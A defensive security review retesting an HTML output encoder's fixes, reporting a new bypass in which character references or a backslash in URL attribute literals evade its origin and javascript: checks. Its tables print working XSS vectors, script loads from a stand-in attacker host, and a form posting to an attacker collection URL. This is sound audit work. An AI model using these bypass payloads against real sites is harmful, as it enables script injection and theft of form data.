# Canoe Security Review — third pass (adversarial retest)

**Subject:** Canoe, the context-aware output encoder in Qlue
**Date:** 2026-07-27
**Revision reviewed:** `e555517` (branch `canoe-hardening`, R29+R30+R31 landed)
**Scope:** adversarial retest of every finding in
[`CANOE-SECURITY-REVIEW-2026-07-25.md`](CANOE-SECURITY-REVIEW-2026-07-25.md) (F1–F24) and
[`CANOE-SECURITY-REVIEW-2026-07-27-1.md`](CANOE-SECURITY-REVIEW-2026-07-27-1.md) (F25–F28) —
confirm or reject
**Method:** independent harness, independent oracle. The repository's own corpus, ledger and verdicts
were read for coverage but used as evidence for nothing.

---

## Verdict

**All twenty-eight findings are closed.** Each was re-probed from scratch on the production render
path (`VelocityViewFactory.render(page, view, writer)`), asserting on what the sink is handed after
the HTML parser has decoded the attribute value — not on Canoe's raw output. Nothing in either review
reproduces, and no finding was found to be closed only in the spelling the remediation happened to
test.

**One new finding.** F29 (**Low**) is the same root cause as F26 and F28 one level up: R30's URL
position machine and R31's prefix buffer both judge **the bytes Canoe emits**, while the browser
judges **the value the HTML tokenizer produces from those bytes**. An HTML character reference — or a
literal backslash — in the URL-structural part of a template's attribute value desynchronises the two,
and the origin gate that closes F26 and the prefix narrowing that closes F28 both stop applying. It is
rated Low, and only because the template shapes it needs are ones almost nobody writes; the outcome
where it applies is the same arbitrary script execution F26 was.

Four further observations are recorded that are not findings: one accepted residual whose severity is
understated, one configuration footgun, one test-infrastructure defect, and the parser's rejection
table.

### At a glance

| # | Severity | Finding | Status |
|---|---|---|---|
| F1–F24 | — | first review | **confirmed closed** |
| F25–F28 | — | second review | **confirmed closed** |
| F29 | Low | R30/R31 judge the serialized bytes, not the decoded value: a character reference (or a leading backslash) in the literal part of a URL attribute defeats the resource-sink origin gate and the `javascript:` prefix narrowing | **open** |

---

## 1. What was run, and what could not be

| Round | What | Volume |
|---|---|---|
| 1 | Per-finding probes for F1–F28, hand-written from the reviews' own exploitation vectors | 168 renders |
| 2 | Sink × literal-prefix × payload matrix, decoded with an HTML5 tokenizer and resolved with a WHATWG URL parser | 5,108 renders, 0 render errors |
| 3 | Randomised differential breakout sweep (own generator, own payload catalogue, own oracle) | 25,000 samples, 22,776 rendered |
| 3 | Randomised structural-equivalence sweep | 6,000 samples |
| 4 | `#set` / macro / `#foreach` / `#if` shapes feeding a resource sink | 13 renders |
| 5 | Parser rejection table (availability, not security) | 15 renders |
| 6 | `Canoe.write(char[], offset, len)` contract, driven directly | 4 writers |
| 7 | `HtmlEncoder.url()`, `js()`, `css()` primitives, called directly (F15, F16) | 17 values |
| — | The project's own verification, re-run: `./gradlew test`, `./gradlew canoeCoverageGate` | 6,566 tests |

**The oracle.** For URL sinks the question "is this exploitable" cannot be answered on Canoe's output,
because two decoders sit between that output and the fetch. The oracle therefore has three stages, and
each stage is somebody else's implementation rather than mine:

1. render through the production path;
2. parse the response with jsoup's HTML5 tokenizer and take the **decoded** attribute value;
3. resolve that value against `http://page.example/dir/` with **Node 24's WHATWG `URL`** (the same
   source of truth `UrlOracleTest` already uses to derive its expectations) and compare the resulting
   origin with a control render in which the payload is inert.

For `javascript:` URLs the third stage percent-decodes the URL body, which is how the HTML Standard
obtains the script source.

**What could not be run.** There is no browser in this environment and no Playwright browser bundle
(`./gradlew browserTest` cannot execute; see §5.3). No claim below rests on a browser observation of
mine. Where a browser claim is needed, F29's evidence is reduced to a decoded value that is **byte for
byte identical** to one the 2026-07-27 pass already confirmed executing in Chromium 149.0.7827.0,
Firefox 151.0 and WebKit 26.5 — the difference between the two lives entirely in the serialized
markup, which the HTML tokenizer removes before anything acts on it. That is stated per finding rather
than assumed globally.

---

## 2. Confirmed closed

Each row is a probe I wrote, run through `VelocityViewFactory.render()`. An empty rendered value means
the attacker's characters do not reach the sink at all.

### First review (F1–F24)

| Finding | Probe | Rendered | Verdict |
|---|---|---|---|
| F1 | `<form onsubmit="v('$d')">`, `<input onselect="v('$d')">` | `v('')` | closed |
| F2 | `<input onfocus>`, `<div onwebkitanimationend>`, `<div onneverheardofthis>` | `h('')` | closed — the prefix rule covers names that do not exist yet |
| F19 | `<img src="y" onreadystatechange="f('$d')">` | `f('')` | closed |
| F17 | `<a onclick="f({a:1,b:'$d'})">` | `b:''` | closed — a colon no longer widens the context |
| F3 | `srcdoc`, `<svg><a xlink:href>`, `action`, `formaction`, `<meta http-equiv=refresh content>`, `poster`, `usemap`, `longdesc`, `manifest`, `ping`, `srcset`, `cite`, `codebase` | empty, or `javascript:` neutralised | closed |
| F4 | `<div style="color:$d">`, `<div style="$d">` | `style="color:"`, `style=""` | closed |
| F5 | `<input placeholder="Search">` before `<a href="javascript:f('$d')">`; and without it | `f('')` in both | closed — ordering no longer matters |
| F6 (code-execution half) | `<script src="$d/app.js">`, `<script src="$d">` | `/app.js`, `""` | closed |
| F6 (residue) | `<img src="$d">`, `<a href="$d">` with `//attacker.example/` | passes through | **accepted by design**, unchanged |
| F7 | `<object data="$d">` | `""` | closed |
| F9 | `write(char[], offset, len)` at offset 3, split mid-page, one character at a time, and with `offset > len` | all four byte-identical and in the same context | closed |
| F10 | `<script>…</scriptfoo> $d …` | reference stays suppressed as script data | closed |
| F11 | `<a href=$d>` | `href=/p?a=b` | closed |
| F12 | `#set($m = "Hello $d")<p>$m</p>` | encoded once, at the print position | closed |
| F13 | `<p<>` | typed `CanoeEncodingException`, no `[Encoding Error]` marker in the body | closed |
| F14 | `<!--a--->` | comment closes, the rest of the page renders | closed |
| F18 | `<!-- licence --><!DOCTYPE html>` | renders | closed |
| F20 | `sandbox`, `rel`, `integrity`, `nonce` | all `""` | closed |
| F24 | `<a href="$base$path">`, `path = @attacker.invalid/x` | `https://app.example%40attacker.invalid/x` | closed — host unmoved |
| — | `<p>$d</p>` with `<img src=x onerror=alert(1)>"'` | `&lt;img src&#61;x …&gt;&quot;&#39;` | body context holds |

### Second review (F25–F28)

| Finding | Probe | Rendered | Verdict |
|---|---|---|---|
| F25 | `<svg><script href="$d">`, `<svg><script xlink:href="$d">`, also uppercase `HREF` / `XLINK:HREF` | `""` | closed |
| F27 | `<frameset><frame src="$d">`, and `<frame src="/$p">` | `""`, `"/"` | closed |
| F26 | `<script src="/$p">`, `"//$p"`, `"https://$p"`, `"https://cdn.example.com$p"`, `"//cdn.example.com$p"`, `<base href="/$p">`, `<link href="/$p">`, `<iframe src="/$p">`, `<object data="/$p">`, `<embed src="/$p">`, `<script src="$base$path">` | every one refused to the literal prefix | closed |
| F26 (no over-refusal) | `<script src="/static/$p">`, `<script src="https://cdn.example.com/$p">` | `app.js` passes | closed without breaking the ordinary shapes |
| F28 | `<a href=" javascript:f('$d')">`, `"java<TAB>script:…"`, leading `\n`, leading `\x01` | `f('')` in all four | closed |

### The six that are not injection findings

These were not re-probed as attacks, because none of them is one. Each was checked directly, in the
way its claim is stated:

| Finding | Check | Result |
|---|---|---|
| F8 (no tests, no docs, no threat model) | `./gradlew test`; `README.md` and `qlue_user_guide.md` | 6,566 tests; both documents now state what is encoded, what is suppressed, what is rejected, what the residual is, and where the reviews are |
| F15 (`url()` corrupts legitimate URLs) | `url()` over a path with non-ASCII, an existing `%20`, a port, a query with `&`, a fragment, `mailto:`, an astral code point | `/p/%C3%A9t%C3%A9?q=a%20b&amp;r=2#frag`, `/a%20b/c` unchanged, port and query structure kept, `%F0%9F%98%80` — all five defects fixed |
| F16 (`js()` truncates astral, `css()` unterminated) | `js()` and `css()` over an astral code point, `</script>`, an apostrophe and a backslash | `'😀'` (a surrogate pair, not a truncated escape), `'\x3C\x2Fscript\x3E'`, `'\000027a'` (six digits, self-delimiting), `'\00005C'` |
| F21 (`CTX_CSS` unreachable) | reflection over `Canoe`'s public fields | no `CTX_CSS` constant exists; the CSS names left are parser states and `ATTR_CSS` |
| F22 (`class` loader declared, never configured) | `VelocityViewFactory.java:148` sets `resource.loader.class.class`; the probe's classpath engine starts and renders real `.vm` files | closed |
| F23 (a `style` value is decoded twice) | `style` is suppressed by name, whatever the value | moot by design, and it is the reason `ATTR_CSS` is still suppressed rather than escaped |

### The corollary, re-derived independently

`ParserSteeringTest`'s claim — no encoder Canoe can dispatch to emits `<`, `>`, `"` or `'` — was
re-tested with my own generator (20 elements × 34 attribute names × 3 quoting styles × 15 literal
prefixes × 6 suffixes × 30 payloads, 6 template shapes, seeded):

* **25,000 samples, 22,776 rendered, 0 counterexamples.** For every one, the count of each of the four
  characters is identical to a render with an inert payload.
* Structural sweep, 6,000 samples: **28 differences, all of them the recorded
  `anEmptyUnquotedValueSwallowsTheNextAttribute` residual** (an unquoted attribute whose value is
  suppressed to empty swallows the next attribute). None is a breakout.

### The remediation's own machinery, probed adversarially

| Probe | Result |
|---|---|
| Scheme completion: `<script src="http$p">` with `p = "://attacker.example/x.js"` | `http%3A//attacker.example/x.js` — the colon is percent-encoded, so no scheme forms |
| `<script src="htt$p">` with `p = "p://attacker.example/x.js"` | `""` — `p:` is not an allowed scheme |
| Sloppy authority spellings at offset 0 (`///host`, `https:host`, `https:/host`, `HTTPS://host`, `//host:80`, `//[::1]`, `blob:`, `filesystem:`, `view-source:`, mixed case `jaVaScRiPt:`) | all refused |
| Values `url()` neutralises rather than refuses: `/\host`, `\/host`, `\\host`, `/%2fhost`, `%2f%2fhost` | emitted percent-escaped, and every one resolves **same-origin** in the WHATWG parser |
| Values whose escaping leaves a forbidden host character: `//host%2f@evil`, `//host%00`, `// host`, `//<TAB>host`, `//:8080` | emitted, and every one **fails to parse** as a URL — no fetch |
| Trusted-origin allowlist: `//cdn.example.com`, `//CDN.EXAMPLE.COM`, `//cdn%2eexample%2ecom` | admitted (correct) |
| `//cdn.example.com.attacker.example`, `//sub.cdn.example.com`, `//cdn.example.com./`, `//attacker/x#cdn.example.com`, `https://cdn.example.com$p` with `p = ".attacker.example/…"` | all refused — no suffix, subdomain or fragment confusion |
| `//cdn.example.com@attacker.example` | emitted as `%40`, which is a forbidden host code point: the URL fails to parse |
| `#set($u = "/$p")`, `#set($u = "https://$p")`, `#macro`, `#foreach`, `#if` feeding `<script src>` | all refused; the deferred-encoding path (R24) judges the value at the position it is printed |
| Application allowlist guard: `sandbox`, `rel`, `srcdoc`, `style`, `href`, `onclick`, `nonce`, `integrity`, `http-equiv`, `charset`, `is`, `content`, `xml:base` | all refused at configuration time |
| A widened plain-text name (`my-widget`) with a breakout payload | `html()`-encoded, cannot leave the attribute |
| Element/attribute combinations deliberately left on `url()` (`<video src>`, `<audio src>`, `<source src>`, `<track src>`, `<input type=image src>`, `<svg><use href>`, `<svg><image href>`) | off-origin passes — matches the recorded decision |
| `<svg><svg:script href>` | off-origin passes; inert, because an HTML parser gives that element the local name `svg:script`, which is not SVG's script element |
| Duplicate attributes, spaces around `=`, newline before the attribute, single quotes, unquoted values, uppercase names | routing unchanged in every case |

---

## 3. F29 — Low: the position machine judges the emitted bytes, not the decoded value

**Location:** `Canoe.advanceUrlValueState()` (`Canoe.java:1031`), the `TAG_ATTR_VALUE` prefix scan
(`Canoe.java:1822-1859`), and `Canoe.isUrlStripped()` (`Canoe.java:989`).

### Mechanism

R30 tracks where in a URL an attribute value has got to by advancing a five-state machine over the
characters Canoe writes. R31 makes the ten-character prefix buffer skip the characters a URL parser
removes. Both operate on **the serialized attribute value**. A browser does not: the HTML tokenizer
decodes character references while building the attribute value, and only the decoded string reaches
the URL parser. The URL parser additionally folds `\` to `/` for the special schemes.

So a character reference — or a backslash — in the literal part of a URL attribute value puts Canoe
and the browser in different places in the same URL:

| Template literal | Canoe's position at the reference | The browser's |
|---|---|---|
| `&#47;` | `URLV_PATH` (an `&` is "not a slash, not a scheme start") | one slash — authority still open |
| `&#47;&#47;` | `URLV_PATH` | inside the authority |
| `&#104;ttps://` | `URLV_PATH` | inside the authority |
| `https&#58;` | `URLV_PATH` | after a special scheme — authority open |
| `\` | `URLV_PATH` | one slash — authority still open |
| `&#9;`, `&Tab;`, `&#32;`, `&#10;` in front of `javascript` | ten characters consumed, prefix undetectable | the characters are removed; the scheme is `javascript` |

`URLV_PATH` is absorbing and answers "nothing after this point can move the host", so
`encodeResourceUrl()` hands the value straight to `urlResource()` — which judges the reference **in
isolation** and correctly says a relative path carries no authority. Both are right about their own
question; the two answers do not compose, which is exactly F26's shape.

### Measured

Rendered on the production path, decoded with an HTML5 tokenizer, resolved with the WHATWG URL parser.
Every row's control render (payload `inert.js`) resolves to `http://page.example`.

| Template | Payload | Rendered | Decoded value | Resolves to |
|---|---|---|---|---|
| `<script src="&#47;$p">` | `/attacker.example/x.js` | `src="&#47;/attacker.example/x.js"` | `//attacker.example/x.js` | `http://attacker.example/x.js` |
| `<script src="&#x2f;$p">` | `/attacker.example/x.js` | `src="&#x2f;/attacker.example/x.js"` | `//attacker.example/x.js` | `http://attacker.example/x.js` |
| `<script src="&sol;$p">` | `/attacker.example/x.js` | `src="&sol;/attacker.example/x.js"` | `//attacker.example/x.js` | `http://attacker.example/x.js` |
| `<script src="\$p">` (Velocity source `"\\$p"`) | `/attacker.example/x.js` | `src="\/attacker.example/x.js"` | `\/attacker.example/x.js` | `http://attacker.example/x.js` |

The same four shapes reproduce on **every** resource-loading sink — `<script src>`, `<svg><script
href>`, `<svg><script xlink:href>`, `<iframe src>`, `<frame src>`, `<embed src>`, `<object data>`,
`<link href>`, `<base href>` — which is 36 rows of a 5,108-row matrix. Further shapes
(`&#104;ttps://`, `https&#58;`, `&#47;&#92;`, `&#47;&#47;`, `/\`) move the origin from a template
literal that was already off-origin-shaped, and are listed in the raw results rather than here.

The `javascript:` half, which is F28 in an entity spelling:

| Template | Rendered | Decoded value |
|---|---|---|
| `<a href="&#9;javascript:f('$id')">` | `href="&#9;javascript:f('%27);window.__pwned=1;//')"` | `<TAB>javascript:f('%27);window.__pwned=1;//')` |
| `<a href="&Tab;javascript:f('$id')">` | as above | as above |
| `<a href="&#32;javascript:f('$id')">` | `href="&#32;javascript:…"` | ` javascript:f('%27);window.__pwned=1;//')` |
| `<a href="&#10;javascript:…">`, `&NewLine;` | — | `\njavascript:f('%27);…')` |
| `<a href="&#106;avascript:f('$id')">` | `href="&#106;avascript:…"` | `javascript:f('%27);window.__pwned=1;//')` |

The last row is the sharpest: the decoded attribute value is **byte for byte** the value F28
documented as executing in Chromium, Firefox and WebKit before R31 — `%27` is percent-decoded when the
`javascript:` URL's script source is obtained, the string literal closes, and `window.__pwned = 1`
runs. The control (`<a href="javascript:f('$id')">`) is `f('')`.

### The bound — what F29 does *not* reach

The desync only matters where Canoe's decision depends on the **value's** characters rather than on
the attribute's name. There are exactly two such decisions, and both are above:

* the R30 position gate on `CTX_URI_RESOURCE`;
* the R31/`detectAttributePrefix()` narrowing that catches an author-written `javascript:` URL.

Name-derived classification is untouched: `style`, every `on*` name, every unrecognised name and every
policy attribute are suppressed whatever their value contains. And no ordinary literal reaches F29:
of the 5,108 matrix rows, **every** origin move on a resource sink involved a character reference
(135 rows) or a literal backslash (27 rows), and **none** involved an ordinary literal — `""`, `/`,
`//`, `https://`, `https://cdn.example.com`, `/static/`, `https://cdn.example.com/`, a leading space,
a tab, a newline. R30 and R31 are right for every template shape anyone actually writes. `&amp;`, the
one character reference that is genuinely common in URLs, is harmless: it can only occur after the
authority has closed, and it decodes to a character that is not URL-structural there.

### Severity

**Low**, and the discount is entirely about the template. The outcome where it applies is arbitrary
script execution with the page's privileges (`<script src>`), a whole-page hijack (`<base href>`) or
an attacker document in the frame tree — the outcomes R9 and R30 exist to prevent — against a
data-only attacker. What holds it to Low is that a template author must have written a URL-structural
character as a character reference, or a backslash at the head of a URL, in the literal part of a URL
attribute. Nobody writes `<script src="&#47;$path">` on purpose. It is a finding rather than a
curiosity for the same reason F28 was one: the failure is silent, the difference between the safe and
the unsafe spelling is invisible to a reviewer, and the invariant the code believes it maintains is
not the invariant it maintains.

### Remediation options

1. **Cheapest, and fail-closed.** While the authority is still open — `urlValueState` in
   {`START`, `SLASH`, `SCHEME`, `AFTER_SCHEME`, `AUTHORITY`} — treat `&` or `\` in the value as
   "position unknown" and refuse a `CTX_URI_RESOURCE` reference for the rest of that value. It costs
   nothing in practice: a query-string `&` is always seen in `URLV_PATH`, where it is ignored, and a
   backslash before the authority is not a thing a URL contains.
2. **Correct, and larger.** Advance both the position machine and the prefix buffer over a
   character-reference-decoded view of the value, and fold `\` to `/` while the authority is open.
   This makes Canoe's view of the value the browser's view, which is the invariant that was missing.
3. Either way, the prefix scan needs the same treatment or the `javascript:` half stays open: if the
   first ten significant characters contain a `&`, Canoe cannot know where the scheme begins, and the
   fail-closed answer is to narrow to a suppressing context rather than to fall through to `url()`.
4. **Corpus rows to add**, since the blind spot is structural rather than accidental — no corpus
   template writes a character reference in a URL attribute's literal text:
   `url.script-src-entity-slash`, `url.script-src-entity-scheme`, `url.script-src-backslash`,
   `prefix.javascript-entity-tab`, `prefix.javascript-entity-j`.
5. **The invariant worth writing down**, because it is the third time the same mistake has been made
   one level up (F26: the encoder cannot see the literal; F28: the scan counts characters the URL
   parser removes; F29: the scan reads bytes the HTML parser removes): *every Canoe decision that
   depends on an attribute value must be taken over the value the HTML tokenizer will produce, not
   over the bytes Canoe emits.*

---

## 4. On the record: the project's own verification

Re-run, on this revision, in this environment:

* `./gradlew test` — **6,566 tests, 0 failures, 0 skipped.** Matches the second review's claim exactly.
* `./gradlew canoeCoverageGate` — **passing.** Every floor met, including the three methods R29–R31
  added (`isResourceLoadingSink`, `advanceUrlValueState`, `encodeResourceUrl`, all at 100%).
* `./gradlew browserTest` — **could not be run**: no Playwright browsers in this environment (see
  §5.3). The browser claims in the second review are therefore neither confirmed nor challenged here.

---

## 5. Observations that are not findings

### 5.1 `<form action>` and `<button formaction>` are in the accepted residue, and are not an open redirect

`<form action="$u">` and `<form action="/$p">` accept an off-origin authority, by the same decision
that keeps `<a href>` and `<img src>` on `url()`. Measured: `<form action="/$p">` with
`p = "/attacker.example/collect"` renders `action="//attacker.example/collect"`.

That is a correct application of the stated policy, and the policy is worth revisiting for this
attribute specifically. The residue is described throughout as "open redirect and referrer leakage",
and for a form the outcome is neither: it is **the contents of the form posted to an origin the
attacker chose** — passwords, tokens, whatever the form carries — with no navigation the user can
inspect first. An off-origin `<a href>` is an ordinary thing for a page to contain; an off-origin
`<form action>` almost never is. Suppressing an off-origin authority on `action`/`formaction` would
cost far less than it would on `href`, and if the decision is to keep it, the ledger and the user
guide should name the outcome rather than fold it into the open-redirect class.

### 5.2 `TrustedOrigin.parse()` accepts wildcard-looking entries and silently matches nothing

`parse("*")` and `parse("*.example.com")` succeed and produce origins whose host is the literal `*` or
`*.example.com`. No URL a browser will load has such a host, so the effect is a configuration that
looks applied and admits nothing. The direction is safe, and it contradicts the method's own contract
("a misconfiguration fails at startup rather than silently matching nothing"). An administrator
writing `qlue.canoe.trustedResourceOrigins=*.cdn.example.com` — the spelling every other allowlist in
the industry uses — gets no diagnostic and a CDN that has stopped loading. Rejecting a host containing
`*` at parse time, with a message saying wildcards are not supported, closes it.

### 5.3 `browserTest` fails with a NullPointerException when no browsers are installed

With no Playwright bundle present, `EngineRosterTest`, `BrowserSmokeTest`, `DetectorSelfTest` and
`SinkSpecificBrowserTest` skip cleanly, but `BrowserCorpusTest` runs with a null engine and produces
73 failures of the shape:

```
java.lang.NullPointerException: Cannot invoke "Object.equals(Object)" because "o" is null
    at BrowserCorpusTest.limitationFor(BrowserCorpusTest.java:367)
    at BrowserCorpusTest.theBrowserAgreesWithTheLedger(BrowserCorpusTest.java:194)
```

A tier that cannot run should skip, not fail — a red build that means "no browser installed" trains
its reader to ignore a red build that means "an engine executed the payload".

### 5.4 The rejection table still holds three shapes a browser accepts

Not security defects — every one fails the request rather than rendering something wrong — but each is
a live template that returns 500:

| Template | Canoe | A browser |
|---|---|---|
| `<svg><![CDATA[a]]></svg>` | `Invalid tag` | legal in foreign content, and ordinary in hand-written SVG |
| `<p>a < b</p>` | `Tag name too short` | text |
| `<script/src="/a.js"></script>` | `Expected '>' after '/' in tag.` | a script element with a `src` |

The third is the interesting one: a browser loads that script and Canoe never sees the attribute, so
refusing the page is the right direction — but it should be a recorded decision, as R20's triage made
the others.

---

## 6. What this pass did not do

* **No browser tier.** Every browser-level claim in §3 is reduced to a decoded value identical to one
  the previous pass confirmed in three engines, and that reduction is stated where it is used. F29
  should be re-measured in Chromium, Firefox and WebKit before it is closed, and the reduction should
  not be taken as a substitute.
* **No review of the accepted residue as a whole.** The 68 `ACCEPTED_RESIDUAL` rows were re-probed for
  behaviour, not re-argued, with the one exception in §5.1.
* **Nothing outside the encoder.** `#evaluate($t)`, `#parse($data)`, `$_x.asis()` and
  `allowDirectOutput()` are out of scope by the threat model both reviews state, and stayed there.
* **No change to the repository.** The probes are throwaway harnesses; every result above is
  reproducible from the templates and payloads printed in it, against `e555517`, with
  `ProductionRenderProbe` and jsoup, and `node -e 'new URL(value, "http://page.example/dir/")'` as
  the URL oracle.
